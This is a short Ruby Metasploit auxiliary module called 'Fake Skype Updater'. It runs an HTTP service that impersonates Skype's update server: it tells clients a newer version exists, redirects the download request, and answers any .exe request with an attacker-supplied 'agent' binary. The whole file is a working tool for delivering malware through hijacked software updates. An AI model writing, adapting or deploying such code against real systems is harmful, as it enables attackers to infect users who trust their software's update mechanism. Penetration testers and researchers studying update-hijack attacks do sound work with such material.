require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Skype Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Skype updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)
		
		@base = {	
			'vh' => ['ui.skype.com'],
	    		'request' => [{
				'req' => 'getnewestversion', 
				'type' => 'string', 
				'bin'    => '',
				'string' => '4.5.0.615',
				'parse' => '',
				'file' => ''
			},
			{
				'req' => 'download', 
				'type' => 'redirect', 
				'to'    => 'http://ui.skype.com/skype_update_4.0.0.215.exe',		    
				'string' => '',
				'parse' => '',
				'file' => ''
			},
			{
				'req' => '.exe', #regex friendly
				'type' => 'agent', #file|string|agent
				'bin'    => 1,
				'method' => '', #any
				'string' => '',
				'parse' => '',
				'file' => ''
			}
			],
			'options' => {
			}
		}
	end
end
